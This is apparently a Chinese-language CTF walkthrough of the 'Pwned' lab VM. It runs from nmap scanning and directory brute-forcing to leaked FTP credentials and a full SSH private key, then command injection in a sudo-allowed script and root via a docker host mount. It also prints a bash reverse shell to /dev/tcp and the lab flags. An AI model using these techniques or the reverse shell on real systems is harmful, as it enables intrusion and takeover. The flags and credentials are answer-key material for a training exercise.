> ⏲️ Release Date // 2020-09-25
>
> ✔️ MD5 // 4fff941050062efd06bc63ac8e740132
>
> ☠ Root // 414
>
> 💀 User // 421

### 主机探测和nmap扫描

```bash
nmap -sn 192.168.56.100/24
```

```
Nmap scan report for 192.168.56.125
Host is up (0.00034s latency).
MAC Address: 08:00:27:EC:DF:9E (Oracle VirtualBox virtual NIC)
```

靶机ip：192.168.56.125

扫描全端口

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.125
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EC:DF:9E (Oracle VirtualBox virtual NIC)
```

扫描21，22，80端口

```bash
nmap -sT -sV -sC -O -p21,22,80 192.168.56.125
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:EC:DF:9E (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### web渗透

访问web页面

> A last note from Attacker :)
>
> I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them.
>
> Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!

```html
<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```

感觉没啥信息

#### 目录爆破

```bash
gobuster dir -u http://192.168.56.125 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

```
/nothing              (Status: 301) [Size: 318] [--> http://192.168.56.125/nothing/]
/server-status        (Status: 403) [Size: 279]
/hidden_text          (Status: 301) [Size: 322] [--> http://192.168.56.125/hidden_text/]
Progress: 207643 / 207644 (100.00%)
```

/nothing

> I said nothing here. you are wasting your time i don't lie

真啥也没有

/hidden_text

```bash
curl http://192.168.56.125/hidden_text/secret.dic
```

发现一些目录文件，继续扫描

```bash
gobuster dir -u http://192.168.56.125 -w secret.dic
```

```
/pwned.vuln           (Status: 301) [Size: 321] [--> http://192.168.56.125/pwned.vuln/]
```

查看该目录

```php
<?php
//      if (isset($_POST['submit'])) {
//              $un=$_POST['username'];
//              $pw=$_POST['password'];
//
//      if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//              echo "welcome"
//              exit();
// }
// else 
//      echo "Invalid creds"
// }
?>
```

得到一组ftp的凭据

> ftpuser:B0ss_B!TcH

### 登录ftp服务

```bash
ftp> ls
229 Entering Extended Passive Mode (|||44776|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> get id_rsa
ftp> get note.txt
```

将文件下载下来

`note.txt`

> Wow you are here
>
> ariana won't happy about this note
>
> sorry ariana :(

`id_rsa`

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### 登录ariana用户ssh服务

```bash
chmod 600 id_rsa
```

```bash
ssh ariana@192.168.56.125 -i id_rsa
```

拿到`user1.txt`

```bash
ariana@pwned:~$ ls
ariana-personal.diary  user1.txt
ariana@pwned:~$ cat user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

`ariana-personal.diary`内容

> Its Ariana personal Diary :::
>
> Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
>
> 其Ariana个人日记：
> 今天赛琳娜和我为阿杰而战。
> 所以我在服务器上打开了她的隐藏文本。
> 现在她要为这个问题负责了。

尝试提权

```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

发现可以使用`selena`的`/home/messenger.sh`

`messenger.sh`内容

```bash
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```

尝试获得到selena用户的shell

```bash
sudo -u selena /home/messenger.sh
```

```bash
Welcome to linux.messenger


ariana:
selena:
ftpuser:

Enter username to send message : 1

Enter message for 1 :bash

Sending message to 1 
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
whoami
selena
```

### docker利用提权

发现selena用户在docker组内

![image-20240526173324595](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240526173324595.png)

> --rm 这个选项表示当容器退出时，Docker将自动删除该容器。这通常用于那些你只想运行一次并立即删除的容器
>
> chroot /mnt sh  这是容器内的命令,将/mnt目录作为根目录，sh就是起一个shell

利用docker挂载/目录到容器的/mnt目录，直接读取文件

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami
root
# cd /root
# cat root.txt
4d4098d64e163d2726959455d046fd7c


You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker
```

拿到root.txt

### 另外

利用pwncat反弹shell

```bash
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : 1

Enter message for 1 :bash

Sending message to 1 
bash -i >& /dev/tcp/192.168.56.101/1234 0>&1
```

kali这边进行监听

```bash
pwncat-cs -lp 1234 
```

![image-20240526174826594](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240526174826594.png)

wfuzz的简单使用

```bash
wfuzz -w secret.dic -u http://192.168.56.125/FUZZ -t 100 --hc 404
```

```
Target: http://192.168.56.125/FUZZ
Total requests: 22

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                  
=====================================================================

000000017:   301        9 L      28 W       321 Ch      "/pwned.vuln"                                                                                            
000000022:   200        75 L     191 W      3065 Ch     "http://192.168.56.125/"                                                                                 

Total time: 0
Processed Requests: 22
Filtered Requests: 20
Requests/sec.: 0
```

